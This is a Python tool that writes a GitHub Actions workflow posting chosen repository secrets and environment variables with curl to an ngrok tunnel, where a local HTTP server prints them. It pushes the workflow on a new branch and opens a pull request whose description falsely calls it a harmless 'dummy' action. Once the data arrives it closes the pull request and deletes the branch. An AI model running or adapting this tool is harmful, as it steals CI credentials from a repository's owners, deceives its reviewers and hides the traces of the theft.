import argparse


import os
import random
import string
from jinja2 import Template

import time
from git import Repo
from github import Github
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
import ngrok
import threading
from functools import wraps
import os
import signal
import json

httpd = None 

def render_action(environment, runs_on, url, keys):
    yaml_template = """
name: Dummy Action

on: [push]

jobs:
  build:
    runs-on: {{ runs_on }}
    {% if environment %}
    environment: {{ environment }}
    {% endif %}
    steps:
      - name: Run dummy command
        run: |
            echo running
            curl -X POST -d '{% raw %}{{% endraw %}{% for key in keys %}"{{ key }}": "{% raw %}${{{% endraw %} {{ key }} {% raw %}}}{% endraw %}"{% if not loop.last %}, {% endif %}{% endfor %}{% raw %}}{% endraw %}' {{ url }}
    """

    template = Template(yaml_template)
    rendered = template.render(
        environment=environment,
        runs_on=runs_on,
        url=url,
        keys=keys
    )
    return rendered


def get_port():
    port = random.randint(8081, 20000)
    return port


class TimeoutException(Exception):
    pass
class OKCloseException(Exception):
    pass

def timeout(seconds):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            # Container to store the result or exception
            result_container = []

            def target_func(*args, **kwargs):
                try:
                    result = func(*args, **kwargs)
                    result_container.append((True, result))
                except Exception as e:
                    result_container.append((False, e))

            thread = threading.Thread(target=target_func, args=args, kwargs=kwargs)
            thread.start()
            thread.join(seconds)
            if thread.is_alive():
                raise TimeoutException("Function call timed out")
            success, result = result_container[0]
            if not success:
                raise result
            return result
        return wrapper
    return decorator


# Define ANSI escape codes for colors
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"


def fmt_color(text, color):
    return f"{color}{text}{RESET}"


def print_color(text, color):
    print(fmt_color(text, color))


class RequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Hello, World!')
        elif self.path.startswith('/echo'):
            message = self.path.split('/echo/')[-1]
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(message.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        json_data = json.loads(post_data.decode())
        print(fmt_color("Received POST request with JSON data:", GREEN))
        print(json.dumps(json_data, indent=2))
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(post_data)
        # https://docs.python.org/3/library/socketserver.html#socketserver.BaseServer.shutdown
        # shutdown() must be called while serve_forever() is running in a different thread otherwise it will deadlock.
        threading.Thread(target=self.server.shutdown).start()


def run_server(port, handler=RequestHandler):
    global httpd 
    server_address = ('', port)
    httpd = HTTPServer(server_address, handler)
    print(f'Starting HTTP server on port {port}')
    httpd.serve_forever()


def start_ngrok(port):
    listener = ngrok.forward(f"localhost:{port}", authtoken_from_env=True)
    print(f"Ingress established at: {listener.url()}")
    return listener


@timeout(60)
def wait_for_response(port):
    try:
        print(fmt_color("Server waiting for payload...", CYAN))
        run_server(port)
        return True
    except TimeoutException:
        print("TimeoutException Function call timed out")
        raise TimeoutException
    except KeyboardInterrupt:
        print('KeyboardInterrupt Stopping server...')
        raise KeyboardInterrupt
    except Exception as e:
        print(f"Exception: {e}")
        raise e


def local_repo(localpath):
    # Initialize the repository
    repo = Repo(localpath)
    assert not repo.bare
    # print git repo owner and name
    # Get the URL of the 'origin' remote
    origin_url = repo.remotes.origin.url

    # Extract owner and repo name from the URL
    pattern = r'github\.com[:/](.*?)/(.*?)(?:\.git)?$'
    match = re.search(pattern, origin_url)

    if match:
        owner = match.group(1)
        repo_name = match.group(2)
        print(fmt_color(f"Repository: ", GREEN) +
              fmt_color(f"{owner}/{repo_name}", CYAN))
        return (repo, owner, repo_name)
    else:
        print_color(
            "Could not parse owner and repository name from the URL", RED)
        return None


def dump_action_yaml(action_file_path, yaml_content):
    os.makedirs(os.path.dirname(action_file_path), exist_ok=True)
    with open(action_file_path, "w") as f:
        f.write(yaml_content)


def create(args):
    
    port = get_port()
    ngrok_listener = start_ngrok(port=str(port))

    content = render_action(environment=args.env, runs_on="ubuntu-latest",
                            url=ngrok_listener.url(), keys=args.val)
    if args.dump_action:
        print(content)
        exit(0)
    # should be in another thread
    thread = threading.Thread(target=wait_for_response, args=(port,))
    # Start the thread
    thread.start()

    print(f"Repo path: {args.path}")
    repo, owner, repo_name = local_repo(args.path)
    # get current branch 
    original_branch = repo.active_branch
    # Create and checkout the new branch
    random_suffix = ''.join(random.choices(
        string.ascii_lowercase + string.digits, k=8))
    branch_name = "prefix-" + random_suffix
    new_branch = repo.create_head(branch_name)
    new_branch.checkout()
    print(fmt_color(f"Branch created: ", GREEN) +
          fmt_color(f"{branch_name}", CYAN))

    # dump YAML content into action file
    action_file_path = os.path.join(
        args.path, ".github", "workflows", "dummy_action.yml")
    dump_action_yaml(action_file_path, yaml_content=content)
    print(fmt_color(f"Action file created: ", GREEN) +
          fmt_color(f"{action_file_path}", CYAN))

    # Stage and commit the changes
    repo.index.add([action_file_path])
    repo.index.commit("Add dummy GitHub action")
    # push the changes 
    origin = repo.remote(name='origin')
    origin.push(refspec=branch_name)

    # Create a pull request
    g = Github(args.gh_token)
    github_repo = g.get_repo(owner + "/" + repo_name)
    pr = github_repo.create_pull(
        title="Add dummy GitHub action",
        body="This PR adds a dummy GitHub action that echoes 'dummy'.",
        head=branch_name,
        base="main"  # or the default branch of your repo
    )

    print(fmt_color(f"Pull request created: ", GREEN) +
          fmt_color(f"{pr.html_url}", CYAN))

    thread.join()
    # close the pull request
    pr.edit(state="closed")
    print(fmt_color(f"Pull request closed: ", GREEN) +
          fmt_color(f"{pr.html_url}", CYAN))

    # checkout to main branch
    repo.git.checkout(original_branch)
    # delete the branch with -D 
    repo.git.branch('-D', branch_name)
    # delete the branch
    # repo.delete_head(branch_name)
    
    print(fmt_color(f"Branch deleted: ", GREEN) +
          fmt_color(f"{branch_name}", CYAN))


def create2(args):
    print(args)
    repo, owner, repo_name = local_repo(args.path)
        # Create a pull request
    g = Github(args.gh_token)
    github_repo = g.get_repo(owner + "/" + repo_name)
    pr = github_repo.create_pull(
        title="Add dummy GitHub action",
        body="This PR adds a dummy GitHub action that echoes 'dummy'.",
        head="prefix-nhn9eiz1",
        base="main"  # or the default branch of your repo
    )
    print("ok")

def main():
    parser = argparse.ArgumentParser(
        usage='%(prog)s create --env staging --val vars.REPO_ENV -t <GH_TOKEN> -p $(pwd)',
        description='''Fetch Info from Github repository environment variables''')
    subparsers = parser.add_subparsers(dest='cmd', help='')

    create_parser = subparsers.add_parser('create', help='Fetch data')
    create_parser.add_argument(
        '--path', '-p', type=str, help='Local Git Repo Path', default=None)
    create_parser.add_argument(
        '--gh-token', '-t', type=str, help='Github API Token', default=None)
    # add argument for list of environment variables
    create_parser.add_argument('-v', '--val', action='append',
                               help='.secrets / .env values to fetch', required=True)
    create_parser.add_argument(
        '-e', '--env', type=str, help='Github Environment to set in action file', default=None)
    # add boolean flag --dump-action with default false 
    create_parser.add_argument(
        '--dump-action', action='store_true', help='Dump the action file to the repo')

    create_parser.set_defaults(func=create)

    options = parser.parse_args()
    options.func(options)


if __name__ == '__main__':
    main()
